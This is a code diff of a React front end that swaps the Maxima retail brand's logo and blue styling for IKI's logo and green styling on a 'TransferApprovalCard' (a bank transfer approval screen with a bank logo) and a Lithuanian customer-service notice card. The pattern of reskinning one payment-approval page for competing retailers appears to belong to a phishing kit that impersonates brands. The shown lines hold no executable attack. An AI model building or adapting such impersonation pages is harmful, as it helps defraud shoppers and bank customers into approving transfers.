@@ -314,11 +314,11 @@ function TransferApprovalCard({
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
       <div className="w-full max-w-[400px] rounded-[24px] border border-[#dce8f5] bg-white px-6 py-7 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
-        {/* Maxima sol ust + banka logosu sag ust */}
+        {/* IKI sol ust + banka logosu sag ust */}
         <div className="mb-6 flex items-start justify-between">
           <img
-            src="/form-assets/maxima-mini-logo.png"
-            alt="Maxima"
+            src="/form-assets/iki-mini-logo.png"
+            alt="IKI"
             className="h-7 w-auto object-contain"
           />
           {bankLogo ? (
@@ -370,9 +370,9 @@ function TransferApprovalCard({
 function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] border border-[#0066CC] bg-[#020b22] p-6 text-center shadow-[0_0_40px_rgba(0,102,204,0.3)] sm:p-10">
+      <div className="w-full max-w-[650px] rounded-[24px] border border-[#0fae4e] bg-[#021a0e] p-6 text-center shadow-[0_0_40px_rgba(15,174,78,0.3)] sm:p-10">
         <div className="mb-4">
-          <p className="text-xs font-bold uppercase tracking-widest text-[#0088FF]">Klientų aptarnavimas</p>
+          <p className="text-xs font-bold uppercase tracking-widest text-[#007a38]">Klientų aptarnavimas</p>
         </div>
 
         <p className="mb-6 whitespace-pre-wrap text-lg font-bold leading-tight text-white">
